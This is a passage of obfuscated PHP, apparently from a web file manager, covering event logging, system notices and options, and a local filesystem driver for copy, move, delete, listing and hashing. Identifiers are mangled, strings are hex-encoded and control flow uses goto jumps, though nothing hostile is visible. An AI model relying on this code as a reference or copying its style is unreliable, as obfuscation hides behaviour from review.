array($Ë§±ûáÒ[181] => $©ï¿ü´÷[$Ë§±ûáÒ[181]], $Ë§±ûáÒ[32] => $©ï¿ü´÷[$Ë§±ûáÒ[32]]); $this->addEvent($ÙŸğ²´¢, $Ë§±ûáÒ[2125], $™Ëö¾èÍ); } public function eventCopy($Ñ‘ÖÛ›) { $this->eventCreate($Ñ‘ÖÛ›, $_SERVER[—ÌÒğš÷][586]); } public function eventRename($¡°Ô¾ë, $®ªÂÈ÷¸, $ò¡©ÄÅ€) { $ïÑ•¬à =& $_SERVER[—ÌÒğš÷]; $¾‰¯á¥Ø = array($ïÑ•¬à[1204] => $®ªÂÈ÷¸, $ïÑ•¬à[1205] => $ò¡©ÄÅ€); return $this->addEvent($¡°Ô¾ë, $ïÑ•¬à[1390], $¾‰¯á¥Ø); } public function eventAddComment($©¦é¼âÉ, $ŸõË­íª) { return $this->addEvent($©¦é¼âÉ, $_SERVER[—ÌÒğš÷][2126], $ŸõË­íª); } public function eventAddDesc($¯€İˆïù, $Ú¥ÔÛ•¸) { return $this->addEvent($¯€İˆïù, $_SERVER[—ÌÒğš÷][2127], $Ú¥ÔÛ•¸); } public function listBySource($¾„½ƒè») { $¨ûîÅšá =& $_SERVER[—ÌÒğš÷]; $å‹Ä„™ = Model($¨ûîÅšá[1376])->sourceInfo($¾„½ƒè»); $Öıúõ“İ = array($¨ûîÅšá[459] => $¾„½ƒè»); if ($å‹Ä„™[$¨ûîÅšá[453]] == $¨ûîÅšá[88]) { $ªê½–àª = Model($¨ûîÅšá[1376])->listSearchChildren($¾„½ƒè», 20000); $ªê½–àª[] = $¾„½ƒè» . $¨ûîÅšá[422]; $Öıúõ“İ = array($¨ûîÅšá[181] => array($¨ûîÅšá[7], $ªê½–àª)); } $½Î²Ôà§ = $this->where($Öıúõ“İ)->order($¨ûîÅšá[2128])->selectPage(); if ($½Î²Ôà§[$¨ûîÅšá[410]][$¨ûîÅšá[411]] == 0) { $½Î²Ôà§[$¨ûîÅšá[410]][$¨ûîÅšá[411]] = 1; $½Î²Ôà§[$¨ûîÅšá[413]] = array(array($¨ûîÅšá[459] => $¾„½ƒè», $¨ûîÅšá[2109] => $å‹Ä„™[$¨ûîÅšá[180]], $¨ûîÅšá[1679] => $å‹Ä„™[$¨ûîÅšá[495]], $¨ûîÅšá[464] => $¨ûîÅšá[2129], $¨ûîÅšá[465] => $å‹Ä„™[$¨ûîÅšá[215]], $¨ûîÅšá[1681] => $¨ûîÅšá[12])); } return $this->eventListParse($½Î²Ôà§, $¾„½ƒè»); } private function eventListParse($‘—ô†, $Û†±©Î) { $ÔüãÜş„ =& $_SERVER[—ÌÒğš÷]; $õ¦¼çöŸ = $‘—ô†[$ÔüãÜş„[413]]; $Íò’Ã°µ = array_to_keyvalue($õ¦¼çöŸ, $ÔüãÜş„[12], $ÔüãÜş„[181]); $ëêë¶Í = array_to_keyvalue($õ¦¼çöŸ, $ÔüãÜş„[12], $ÔüãÜş„[2115]); foreach ($õ¦¼çöŸ as $¸…¼®ŒÔ) { $²Çíƒ€³ = $¸…¼®ŒÔ[$ÔüãÜş„[494]]; if ($¸…¼®ŒÔ[$ÔüãÜş„[33]] == $ÔüãÜş„[588] && isset($²Çíƒ€³[$ÔüãÜş„[1204]])) { $Íò’Ã°µ[] = $²Çíƒ€³[$ÔüãÜş„[1204]] . $ÔüãÜş„[12]; $Íò’Ã°µ[] = $²Çíƒ€³[$ÔüãÜş„[1205]] . $ÔüãÜş„[12]; } if ($¸…¼®ŒÔ[$ÔüãÜş„[33]] == $ÔüãÜş„[2125] && isset($²Çíƒ€³[$ÔüãÜş„[181]])) { $Íò’Ã°µ[] = $²Çíƒ€³[$ÔüãÜş„[181]] . $ÔüãÜş„[12]; } } $Íò’Ã°µ = array_merge($Íò’Ã°µ, $ëêë¶Í, array($Û†±©Î . $ÔüãÜş„[12])); $Íò’Ã°µ = array_unique($Íò’Ã°µ); $Ÿú“êÏ¦ = array_unique(array_to_keyvalue($õ¦¼çöŸ, $ÔüãÜş„[12], $ÔüãÜş„[1688])); $™öıÑó¹ = Model($ÔüãÜş„[567])->userListInfo($Ÿú“êÏ¦); $¶¿ëçÛ = Model($ÔüãÜş„[861])->sourceListInfo($Íò’Ã°µ, !0); foreach ($õ¦¼çöŸ as &$¸…¼®ŒÔ) { if ($¸…¼®ŒÔ[$ÔüãÜş„[33]] == $ÔüãÜş„[588] && isset($¸…¼®ŒÔ[$ÔüãÜş„[494]][$ÔüãÜş„[1204]])) { $¸…¼®ŒÔ[$ÔüãÜş„[494]][$ÔüãÜş„[1204]] = $¶¿ëçÛ[$¸…¼®ŒÔ[$ÔüãÜş„[494]][$ÔüãÜş„[1204]]]; $¸…¼®ŒÔ[$ÔüãÜş„[494]][$ÔüãÜş„[1205]] = $¶¿ëçÛ[$¸…¼®ŒÔ[$ÔüãÜş„[494]][$ÔüãÜş„[1205]]]; } if ($¸…¼®ŒÔ[$ÔüãÜş„[33]] == $ÔüãÜş„[2125] && isset($¸…¼®ŒÔ[$ÔüãÜş„[494]][$ÔüãÜş„[181]])) { $¸…¼®ŒÔ[$ÔüãÜş„[494]][$ÔüãÜş„[181]] = $¶¿ëçÛ[$¸…¼®ŒÔ[$ÔüãÜş„[494]][$ÔüãÜş„[181]]]; } $¸…¼®ŒÔ[$ÔüãÜş„[87]] = $¶¿ëçÛ[$¸…¼®ŒÔ[$ÔüãÜş„[181]]]; $¸…¼®ŒÔ[$ÔüãÜş„[2130]] = $¶¿ëçÛ[$¸…¼®ŒÔ[$ÔüãÜş„[2115]]]; if ($¸…¼®ŒÔ[$ÔüãÜş„[33]] == $ÔüãÜş„[1856]) { $¸…¼®ŒÔ[$ÔüãÜş„[2130]] = $¸…¼®ŒÔ[$ÔüãÜş„[87]]; $¸…¼®ŒÔ[$ÔüãÜş„[2115]] = $¸…¼®ŒÔ[$ÔüãÜş„[2130]][$ÔüãÜş„[181]]; $¸…¼®ŒÔ[$ÔüãÜş„[87]] = !1; $¸…¼®ŒÔ[$ÔüãÜş„[181]] = $ÔüãÜş„[12]; } $¸…¼®ŒÔ[$ÔüãÜş„[2059]] = $™öıÑó¹[$¸…¼®ŒÔ[$ÔüãÜş„[1688]]]; } unset($¸…¼®ŒÔ); $‘—ô†[$ÔüãÜş„[413]] = $õ¦¼çöŸ; return $‘—ô†; } public function removeBySource($åÁ‚°Ô€) { $ÈÊÒß = array($_SERVER[—ÌÒğš÷][459] => $åÁ‚°Ô€); $this->where($ÈÊÒß)->remove(); } } goto B‹ê±Åİ·Ş; DïÃ•¶‘Ó°: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\156\157\x74\151\143\145\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x63\157\x6e\164\x65\156\x74", "\141\x75\x74\150", "\155\157\x64\145", "\164\x69\x6d\x65", "\164\171\x70\145", "\154\145\x76\145\x6c", "\x65\x6e\141\x62\x6c\145", "\x73\157\x72\164"); public function listData($öŠ¦®ıÕ = false, $È˜Û› = "\x73\x6f\162\164", $ÙÁ´îó¼ = false) { return parent::listData($öŠ¦®ıÕ, $È˜Û›, $ÙÁ´îó¼); } public function add($óÊ· ÀÆ) { $”»Ø½Ïü =& $_SERVER[—ÌÒğš÷]; $Ì÷ÑÉŒ = time(); if ($óÊ· ÀÆ[$”»Ø½Ïü[16]] == $”»Ø½Ïü[2322]) { $Ì÷ÑÉŒ = strtotime($óÊ· ÀÆ[$”»Ø½Ïü[194]]); } $óÊ· ÀÆ[$”»Ø½Ïü[194]] = $Ì÷ÑÉŒ; return parent::insert($óÊ· ÀÆ); } public function update($î ¬ÃêÏ, $‚š‰¯˜ƒ) { $úœçÊì¥ =& $_SERVER[—ÌÒğš÷]; $ÊŒ„£Ñ² = $this->listData($î ¬ÃêÏ); if (!$ÊŒ„£Ñ²) { return !1; } $™æƒ´ì = time(); if ($‚š‰¯˜ƒ[$úœçÊì¥[16]] == $úœçÊì¥[2322]) { $™æƒ´ì = strtotime($‚š‰¯˜ƒ[$úœçÊì¥[194]]); } $‚š‰¯˜ƒ[$úœçÊì¥[194]] = $™æƒ´ì; return parent::update($î ¬ÃêÏ, $‚š‰¯˜ƒ); } public function remove($£¡éôˆÒ) { $Ä¬§Ô = $this->listData($£¡éôˆÒ); if (!$Ä¬§Ô || $Ä¬§Ô[$_SERVER[—ÌÒğš÷][179]]) { return !1; } return parent::remove($£¡éôˆÒ); } public function sort($¹üÎ“Š, $Íä¦äıñ) { return parent::update($¹üÎ“Š, $Íä¦äıñ); } public function enable($§“½ûú, $èæ‹¨ÒŒ) { return parent::update($§“½ûú, array($_SERVER[—ÌÒğš÷][2323] => $èæ‹¨ÒŒ)); } private function initUserOption() { $éóÇú†¸ =& $_SERVER[—ÌÒğš÷]; $this->optionType = $éóÇú†¸[2324]; $this->modelType = $éóÇú†¸[2325]; $this->field = array($éóÇú†¸[2326], $éóÇú†¸[32], $éóÇú†¸[194], $éóÇú†¸[33], $éóÇú†¸[2327], $éóÇú†¸[786], $éóÇú†¸[210]); } public function userNoticeGet($º¤à”Ğª = false) { $this->initUserOption(); return parent::listData($º¤à”Ğª, $_SERVER[—ÌÒğš÷][443], !0); } public function userNoticeAdd($Ş„·Ô–‡) { $Êšôô­ =& $_SERVER[—ÌÒğš÷]; $this->initUserOption(); $”•›¶×ô = $this->findByKey($Êšôô­[2326], $Ş„·Ô–‡[$Êšôô­[443]]); if ($”•›¶×ô) { return !0; } $úôó‡À× = array($Êšôô­[2326] => $Ş„·Ô–‡[$Êšôô­[443]], $Êšôô­[32] => $Ş„·Ô–‡[$Êšôô­[32]], $Êšôô­[194] => $Ş„·Ô–‡[$Êšôô­[194]], $Êšôô­[33] => isset($Ş„·Ô–‡[$Êšôô­[33]]) ? $Ş„·Ô–‡[$Êšôô­[33]] : 1, $Êšôô­[2327] => isset($Ş„·Ô–‡[$Êšôô­[2327]]) ? $Ş„·Ô–‡[$Êšôô­[2327]] : 0, $Êšôô­[786] => 0, $Êšôô­[210] => 0); return parent::insert($úôó‡À×); } public function userNoticeEdit($âÉ›£›×, $ßûÚÔ“–) { $this->initUserOption(); return parent::update($âÉ›£›×, $ßûÚÔ“–); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\x65\155\x5f\x6f\x70\164\151\157\156"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\x6f\x6c\x65", "\162\x6f\x6c\145\107\162\157\165\160", "\162\145\147\x69\x73\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($·ûçÛ®Ù) { return "\123\171\x73\x74\145\155\117\x70\x74\151\157\x6e\137{$·ûçÛ®Ù}"; } protected function optionDefault($æ‹ùöÅ = '') { $ıÇ‘³—“ =& $_SERVER[—ÌÒğš÷]; if ($æ‹ùöÅ == $ıÇ‘³—“[12]) { return $GLOBALS[$ıÇ‘³—“[6]][$ıÇ‘³—“[425]]; } } } class SystemRecordModel extends ModelBaseLight { } goto c§åŒÙÅÚ; EÈ‚àùŸæ: define($_SERVER[—ÌÒğš÷][282], 1); define($_SERVER[—ÌÒğš÷][283], 2); define($_SERVER[—ÌÒğš÷][284], 3); goto C•‰°øæ; B¤…Ø™™ä©: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¤ïª¦°) { if (substr($¤ïª¦°, 0, 2) == $_SERVER[—ÌÒğš÷][1397]) { $¤ïª¦° = BASIC_PATH . substr($¤ïª¦°, 2); } return $¤ïª¦°; } public function iconvApp($•¬´³ÂÔ) { $ËÇêĞ®Ê =& $_SERVER[—ÌÒğš÷]; global $config; return $this->iconvTo($•¬´³ÂÔ, $config[$ËÇêĞ®Ê[1395]], $config[$ËÇêĞ®Ê[1394]]); } public function iconvSystem($ßÜŸ°£Æ) { $¥š÷‰Î˜ =& $_SERVER[—ÌÒğš÷]; global $config; return $this->iconvTo($ßÜŸ°£Æ, $config[$¥š÷‰Î˜[1394]], $config[$¥š÷‰Î˜[1395]]); } public function getPathOuter($°Š¹‚ö°) { $ë¶•áÕÚ =& $_SERVER[—ÌÒğš÷]; $›ÜÕšºô = $this->iconvApp($this->pathBase); $°Š¹‚ö° = $this->iconvApp($°Š¹‚ö°); if (substr($›ÜÕšºô, 0, 2) == $ë¶•áÕÚ[1397]) { $›ÜÕšºô = BASIC_PATH . substr($›ÜÕšºô, 2); } if (substr($°Š¹‚ö°, 0, 2) == $ë¶•áÕÚ[1397]) { $°Š¹‚ö° = BASIC_PATH . substr($°Š¹‚ö°, 2); } $›ÜÕšºô = KodIO::clear($›ÜÕšºô); $°Š¹‚ö° = KodIO::clear($°Š¹‚ö°); $°Š¹‚ö° = substr($°Š¹‚ö°, strlen($›ÜÕšºô)); if (empty($this->pathDriver)) { return $°Š¹‚ö°; } return $this->pathDriver . $ë¶•áÕÚ[8] . ltrim($°Š¹‚ö°, $ë¶•áÕÚ[8]); } public function mkfile($Œ™ãêØ, $ÕÁ¶ùÛ = '', $‰ø¡‘ë“ = REPEAT_RENAME) { $Œ™ãêØ = $this->iconvSystem($Œ™ãêØ); @touch($Œ™ãêØ); if ($ÕÁ¶ùÛ) { file_put_contents($Œ™ãêØ, $ÕÁ¶ùÛ); } @chmod($Œ™ãêØ, $this->pathAuth); return is_file($Œ™ãêØ) ? $this->getPathOuter($Œ™ãêØ) : !1; } public function mkdir($¥ò°£½, $œñè»Äî = REPEAT_SKIP) { $¥ò°£½ = $this->iconvSystem($¥ò°£½); if (is_dir($¥ò°£½)) { return $this->getPathOuter($¥ò°£½); } @mkdir($¥ò°£½, $this->pathAuth, !0); @chmod($¥ò°£½, $this->pathAuth); return is_dir($¥ò°£½) ? $this->getPathOuter($¥ò°£½) : !1; } public function copyFile($İíŞ‰óÓ, $¬ïÚİ¡) { $this->mkdir($this->pathFather($¬ïÚİ¡)); $İíŞ‰óÓ = $this->iconvSystem($İíŞ‰óÓ); $¬ïÚİ¡ = $this->iconvSystem($¬ïÚİ¡); $æà¿¹°¿ = copy_64($İíŞ‰óÓ, $¬ïÚİ¡); @chmod($¬ïÚİ¡, $this->pathAuth); return $æà¿¹°¿ ? $this->getPathOuter($¬ïÚİ¡) : !1; } public function moveFile($ø‰ù‡µ, $‚˜Ôå²„) { $this->mkdir($this->pathFather($‚˜Ôå²„)); $ø‰ù‡µ = $this->iconvSystem($ø‰ù‡µ); $‚˜Ôå²„ = $this->iconvSystem($‚˜Ôå²„); $æ³çëˆ¢ = intval(@rename($ø‰ù‡µ, $‚˜Ôå²„)); if (!$æ³çëˆ¢) { if ($æ³çëˆ¢ = intval(@copy_64($ø‰ù‡µ, $‚˜Ôå²„))) { @unlink($ø‰ù‡µ); } } @chmod($‚˜Ôå²„, $this->pathAuth); return $æ³çëˆ¢ ? $this->getPathOuter($‚˜Ôå²„) : !1; } public function movePath($ÃÚûË’­, $¬ì¬â¤Ê, $²„Ó÷Ê = false) { $ïÑÇ£µâ =& $_SERVER[—ÌÒğš÷]; $ÃÚûË’­ = $this->iconvSystem($ÃÚûË’­); $¬ì¬â¤Ê = $this->iconvSystem($¬ì¬â¤Ê); $„É·÷°İ = rtrim($¬ì¬â¤Ê, $ïÑÇ£µâ[8]) . $ïÑÇ£µâ[8] . ($²„Ó÷Ê ? $²„Ó÷Ê : get_path_this($ÃÚûË’­)); if (file_exists($„É·÷°İ)) { return !1; } $ÓŞ×Ì¸ë = intval(@rename($ÃÚûË’­, $„É·÷°İ)); $ÓŞ×Ì¸ë = file_exists($„É·÷°İ); return $ÓŞ×Ì¸ë ? $this->getPathOuter($„É·÷°İ) : !1; } public function delFile($İ“˜İÈ‘) { $İ“˜İÈ‘ = $this->iconvSystem($İ“˜İÈ‘); if (!@unlink($İ“˜İÈ‘)) { @chmod($İ“˜İÈ‘, $this->pathAuth); if (!@unlink($İ“˜İÈ‘)) { return !1; } } else { return !0; } } public function delFolder($Ş¡ÛËæù) { $–Âõ³îÎ =& $_SERVER[—ÌÒğš÷]; $Ş¡ÛËæù = $this->iconvSystem($Ş¡ÛËæù); if (!is_dir($Ş¡ÛËæù)) { return !0; } if (!($¶¤¸‚Ì = opendir($Ş¡ÛËæù))) { return !1; } while (($¬»Æüñ¤ = readdir($¶¤¸‚Ì)) !== !1) { if ($¬»Æüñ¤ == $–Âõ³îÎ[10] || $¬»Æüñ¤ == $–Âõ³îÎ[1322]) { continue; } $Ì”’µ·° = $Ş¡ÛËæù . $–Âõ³îÎ[8] . $¬»Æüñ¤; if (is_file($Ì”’µ·°) || is_link($Ì”’µ·°)) { if (!unlink($Ì”’µ·°)) { chmod($Ì”’µ·°, $this->pathAuth); if (!unlink($Ì”’µ·°)) { return !1; } } } else { if (is_dir($Ì”’µ·°)) { chmod($Ì”’µ·°, $this->pathAuth); $Ì”’µ·° = $this->iconvApp($Ì”’µ·°); if (!$this->delFolder($Ì”’µ·°)) { return !1; } } } } closedir($¶¤¸‚Ì); return rmdir($Ş¡ÛËæù); } public function rename($á‰ã¦ö, $¶Å•Ñô) { $«ã¯Ù˜ =& $_SERVER[—ÌÒğš÷]; $À“üÒä× = $this->fileNameAuto($this->pathFather($á‰ã¦ö), $¶Å•Ñô); $À“üÒä× = $this->iconvSystem($À“üÒä×); $á‰ã¦ö = $this->iconvSystem($á‰ã¦ö); $Ö¡Š¥×§ = $this->pathFather($á‰ã¦ö); $îÄüñ³÷ = rtrim($Ö¡Š¥×§, $«ã¯Ù˜[8]) . $«ã¯Ù˜[8] . $À“üÒä×; $Ä”Ÿ“°¯ = @rename($á‰ã¦ö, $îÄüñ³÷); $îÄüñ³÷ = $this->iconvApp($îÄüñ³÷); return $Ä”Ÿ“°¯ ? $this->getPathOuter($îÄüñ³÷) : !1; } public function size($ÊÀá­Ù­) { $ÊÀá­Ù­ = $this->iconvSystem($ÊÀá­Ù­); return filesize_64($ÊÀá­Ù­); } public function info($Ñ³İÏÈ¼) { $Ñ³İÏÈ¼ = $this->iconvSystem($Ñ³İÏÈ¼); if ($this->isFolder($Ñ³İÏÈ¼)) { return $this->folderInfo($Ñ³İÏÈ¼); } else { if ($this->isFile($Ñ³İÏÈ¼)) { return $this->fileInfo($Ñ³İÏÈ¼); } } return !1; } protected function infoChildren($‘ĞÎÉ™, &$©¶Çå”Ò, $îı€µ‡ = true) { $×²ììŠ =& $_SERVER[—ÌÒğš÷]; check_abort_echo(); $‘ĞÎÉ™ = rtrim($‘ĞÎÉ™, $×²ììŠ[8]) . $×²ììŠ[8]; if ($îı€µ‡) { $‘ĞÎÉ™ = $this->iconvSystem($‘ĞÎÉ™); } if (!($ƒ€¸€şë = @opendir($‘ĞÎÉ™))) { return; } while (($ó—¢½ÑÆ = readdir($ƒ€¸€şë)) !== !1) { if ($ó—¢½ÑÆ == $×²ììŠ[10] || $ó—¢½ÑÆ == $×²ììŠ[1322]) { continue; } $¹êÆò˜ö = $‘ĞÎÉ™ . $ó—¢½ÑÆ; if (is_file($¹êÆò˜ö) || is_link($¹êÆò˜ö)) { $©¶Çå”Ò[$×²ììŠ[77]]++; $©¶Çå”Ò[$×²ììŠ[76]] += filesize_64($¹êÆò˜ö); } else { if (is_dir($¹êÆò˜ö)) { $©¶Çå”Ò[$×²ììŠ[78]]++; $this->infoChildren($¹êÆò˜ö, $©¶Çå”Ò, !1); } } } closedir($ƒ€¸€şë); } private function folderInfo($´ãÌÉÁá, $ğ¡¡¼óÆ = false) { $ô´Ãõöá =& $_SERVER[—ÌÒğš÷]; $´ãÌÉÁá = rtrim($´ãÌÉÁá, $ô´Ãõöá[8]) . $ô´Ãõöá[8]; $åíØ…§ = $this->iconvApp($this->pathThis($´ãÌÉÁá)); if ($ğ¡¡¼óÆ) { return array($ô´Ãõöá[32] => $åíØ…§, $ô´Ãõöá[84] => $this->getPathOuter($´ãÌÉÁá), $ô´Ãõöá[33] => $ô´Ãõöá[75]); } $ÅÕ•€œ = array($ô´Ãõöá[32] => $åíØ…§, $ô´Ãõöá[84] => $this->getPathOuter($´ãÌÉÁá), $ô´Ãõöá[33] => $ô´Ãõöá[75], $ô´Ãõöá[215] => @filectime($´ãÌÉÁá), $ô´Ãõöá[85] => @filemtime($´ãÌÉÁá), $ô´Ãõöá[1406] => @fileatime($´ãÌÉÁá), $ô´Ãõöá[1407] => is_readable($´ãÌÉÁá), $ô´Ãõöá[1408] => is_writable($´ãÌÉÁá), $ô´Ãõöá[1409] => get_mode($´ãÌÉÁá)); return $ÅÕ•€œ; } private function fileInfo($²¦÷´°‘, $›†½”à = false) { $°®ë‰Àí =& $_SERVER[—ÌÒğš÷]; $ ŠÃÚ½¾ = $this->iconvApp($this->pathThis($²¦÷´°‘)); if ($›†½”à) { return array($°®ë‰Àí[32] => $ ŠÃÚ½¾, $°®ë‰Àí[84] => $this->getPathOuter($²¦÷´°‘), $°®ë‰Àí[33] => $°®ë‰Àí[214], $°®ë‰Àí[76] => $this->size($²¦÷´°‘), $°®ë‰Àí[175] => $this->ext($ ŠÃÚ½¾)); } $ÃóÄé¿Ï = array($°®ë‰Àí[32] => $ ŠÃÚ½¾, $°®ë‰Àí[84] => $this->getPathOuter($²¦÷´°‘), $°®ë‰Àí[33] => $°®ë‰Àí[214], $°®ë‰Àí[215] => @filectime($²¦÷´°‘), $°®ë‰Àí[85] => @filemtime($²¦÷´°‘), $°®ë‰Àí[1406] => @fileatime($²¦÷´°‘), $°®ë‰Àí[76] => $this->size($²¦÷´°‘), $°®ë‰Àí[175] => $this->ext($ ŠÃÚ½¾), $°®ë‰Àí[1407] => is_readable($²¦÷´°‘), $°®ë‰Àí[1408] => is_writable($²¦÷´°‘), $°®ë‰Àí[1409] => get_mode($²¦÷´°‘)); return $ÃóÄé¿Ï; } public function exist($îÑÔòê) { $îÑÔòê = $this->iconvSystem($îÑÔòê); return @file_exists($îÑÔòê); } public function isFile($’„¯ÛÄñ) { $’„¯ÛÄñ = $this->iconvSystem($’„¯ÛÄñ); return @is_file($’„¯ÛÄñ); } public function isFolder($µ©‰°Õ­) { $µ©‰°Õ­ = $this->iconvSystem($µ©‰°Õ­); return @is_dir($µ©‰°Õ­); } public function listPath($›ÀÒ£ş—, $³¨·ü´¥ = false) { $ñ°‡‡±ä =& $_SERVER[—ÌÒğš÷]; $›ÀÒ£ş— = $this->iconvSystem($›ÀÒ£ş—); $›ÀÒ£ş— = rtrim($›ÀÒ£ş—, $ñ°‡‡±ä[8]) . $ñ°‡‡±ä[8]; $ÙÚ²øš = array($ñ°‡‡±ä[82] => array(), $ñ°‡‡±ä[83] => array()); if (!($‡ïà÷ƒÎ = @opendir($›ÀÒ£ş—))) { return $ÙÚ²øš; } while (($ÃşÛí¥À = readdir($‡ïà÷ƒÎ)) !== !1) { if ($ÃşÛí¥À == $ñ°‡‡±ä[10] || $ÃşÛí¥À == $ñ°‡‡±ä[1322]) { continue; } $ô‰¦ ¹‹ = $›ÀÒ£ş— . $ÃşÛí¥À; if (is_file($ô‰¦ ¹‹)) { $ÙÚ²øš[$ñ°‡‡±ä[83]][] = $this->fileInfo($ô‰¦ ¹‹, $³¨·ü´¥); } else { $ÙÚ²øš[$ñ°‡‡±ä[82]][] = $this->folderInfo($ô‰¦ ¹‹, $³¨·ü´¥); } } closedir($‡ïà÷ƒÎ); return $ÙÚ²øš; } public function listAll($»˜¸ô˜º, &$†àª–ù = array()) { $‚­ğñê =& $_SERVER[—ÌÒğš÷]; $»˜¸ô˜º = $this->iconvSystem($»˜¸ô˜º); $»˜¸ô˜º = rtrim($»˜¸ô˜º, $‚­ğñê[8]) . $‚­ğñê[8]; if (!($úÂÒµç¦ = @opendir($»˜¸ô˜º))) { return $†àª–ù; } while (($çÄó‘Â± = readdir($úÂÒµç¦)) !== !1) { if ($çÄó‘Â± == $‚­ğñê[10] || $çÄó‘Â± == $‚­ğñê[1322]) { continue; } $ÃàÊ““‹ = $»˜¸ô˜º . $çÄó‘Â±; $ø£«²Å­ = is_dir($ÃàÊ““‹) && !is_link($ÃàÊ““‹) ? 1 : 0; $ÃàÊ““‹ = $ø£«²Å­ ? $ÃàÊ““‹ . $‚­ğñê[8] : $ÃàÊ““‹; $†àª–ù[] = array($‚­ğñê[84] => $ÃàÊ““‹, $‚­ğñê[75] => $ø£«²Å­, $‚­ğñê[85] => intval(@filemtime($ÃàÊ““‹)), $‚­ğñê[76] => $ø£«²Å­ ? 0 : intval($this->size($ÃàÊ““‹))); if ($ø£«²Å­) { $this->listAll($ÃàÊ““‹, $†àª–ù); } } closedir($úÂÒµç¦); return $†àª–ù; } public function has($¤öÅ¶Çˆ, $À ¨Å£Ø = false, $˜Û÷‚¨Û = true) { $¿Üª³áĞ =& $_SERVER[—ÌÒğš÷]; $¤öÅ¶Çˆ = $this->iconvSystem($¤öÅ¶Çˆ); $¤öÅ¶Çˆ = rtrim($¤öÅ¶Çˆ, $¿Üª³áĞ[8]) . $¿Üª³áĞ[8]; if (!($’Ë ¥¤— = @opendir($¤öÅ¶Çˆ))) { return !1; } $ÉåŒó·Ü = 0; $ö¤„»é² = 0; $•²áÅğü = 0; while (($Ü§ƒİµİ = readdir($’Ë ¥¤—)) !== !1) { if ($Ü§ƒİµİ == $¿Üª³áĞ[10] || $Ü§ƒİµİ == $¿Üª³áĞ[1322]) { continue; } $´ğ¿Í—´ = $¤öÅ¶Çˆ . $Ü§ƒİµİ; if ($À ¨Å£Ø) { $•²áÅğü++; if (@is_file($´ğ¿Í—´)) { $ÉåŒó·Ü++; } else { $ö¤„»é²++; } if ($•²áÅğü > 10000) { break; } continue; } if ($˜Û÷‚¨Û) { if (@is_file($´ğ¿Í—´)) { return !0; } } else { if (@is_dir($´ğ¿Í—´ . $¿Üª³áĞ[8])) { return !0; } } } closedir($’Ë ¥¤—); if ($À ¨Å£Ø) { return array($¿Üª³áĞ[223] => $ÉåŒó·Ü, $¿Üª³áĞ[224] => $ö¤„»é²); } return !1; } public function hashSimple($Í¬È ‰­) { $à¤Æ¿Úì =& $_SERVER[—ÌÒğš÷]; if (!$Í¬È ‰­) { return md5($à¤Æ¿Úì[12]); } $Í¬È ‰­ = $this->iconvSystem($Í¬È ‰­); $È´Èê»¶ = $this->size($Í¬È ‰­); $¬ç¹ßö = 200; $æ¾ç–‘» = 50; if ($È´Èê»¶ <= $¬ç¹ßö * $æ¾ç–‘») { return $this->hashMd5($Í¬È ‰­) . $È´Èê»¶; } $ÆÃµåß = $à¤Æ¿Úì[12]; $˜ìïˆÁ = intval($È´Èê»¶ / $æ¾ç–‘»); $€¿ò’Õ = fopen($Í¬È ‰­, $à¤Æ¿Úì[1410]); if (!$€¿ò’Õ) { return $ÆÃµåß; } for ($°¤´’÷ö = 0; $°¤´’÷ö < $æ¾ç–‘»; $°¤´’÷ö++) { fseek_64($€¿ò’Õ, $˜ìïˆÁ * $°¤´’÷ö); $ÆÃµåß .= fread($€¿ò’Õ, $¬ç¹ßö); } fseek_64($€¿ò’Õ, $È´Èê»¶ - $¬ç¹ßö); $ÆÃµåß .= fread($€¿ò’Õ, $¬ç¹ßö); fclose($€¿ò’Õ); return md5($ÆÃµåß) . $È´Èê»¶; } public function getContent($ÁÈÕ³‡§) { $ÁÈÕ³‡§ = $this->iconvSystem($ÁÈÕ³‡§); return file_get_contents($ÁÈÕ³‡§); } public function setContent($œ‹Åòøâ, $¤®ì«êó = '') { $œ‹Åòøâ = $this->iconvSystem($œ‹Åòøâ); $¨÷Ô±øğ = @file_put_contents($œ‹Åòøâ, $¤®ì«êó, LOCK_EX); clearstatcache(); @chmod($œ‹Åòøâ, $this->pathAuth); return $¨÷Ô±øğ === !1 ? !1 : !0; } public function fileSubstr($£€É˜¢, $‘ ÔªÃ£ = 0, $‘Ñ†¬ñé = false) { $÷İæßå =& $_SERVER[—ÌÒğš÷]; $£€É˜¢ = $this->iconvSystem($£€É˜¢); if ($‘Ñ†¬ñé === !1) { $‘Ñ†¬ñé = $this->size($£€É˜¢); } if ($‘Ñ†¬ñé <= 0) { return $÷İæßå[12]; } $Ò–·ˆ±€ = fopen($£€É˜¢, $÷İæßå[1410]); if (!$Ò–·ˆ±€) { return !1; } fseek_64($Ò–·ˆ±€, $‘ ÔªÃ£); $‘×’Ù¢À = fread($Ò–·ˆ±€, $‘Ñ†¬ñé); fclose($Ò–·ˆ±€); return $‘×’Ù¢À; } public function upload($„‡–‡²ö, $şË³¬Ö, $ËÍŸ‹¾ñ = false, $Ù—èÁ‰ = REPEAT_REPLACE) { if ($ËÍŸ‹¾ñ) { return $this->moveFile($şË³¬Ö, $„‡–‡²ö); } return $this->copyFile($şË³¬Ö, $„‡–‡²ö); } public function setModifyTime($¿¨¢éØ©, $¢°–Ê´ = '') { @touch($¿¨¢éØ©, intval($¢°–Ê´)); } public function download($¤îµ¦×¹, $ˆååÖÉ‰) { return $this->iconvSystem($¤îµ¦×¹); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($½ú–ÁÂ) { parent::__construct($½ú–ÁÂ); $this->signatureVersion($_SERVER[—ÌÒğš÷][231]); } public function fileOutLink($ÚŠ¢à¼Ï) { $¢¸…ÄÁ =& $_SERVER[—ÌÒğš÷]; if (substr($ÚŠ¢à¼Ï, 0, 7) == $¢¸…ÄÁ[1374]) { $ÚŠ¢à¼Ï = $¢¸…ÄÁ[1375] . substr($ÚŠ¢à¼Ï, 7); } header($¢¸…ÄÁ[162] . $ÚŠ¢à¼Ï); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = 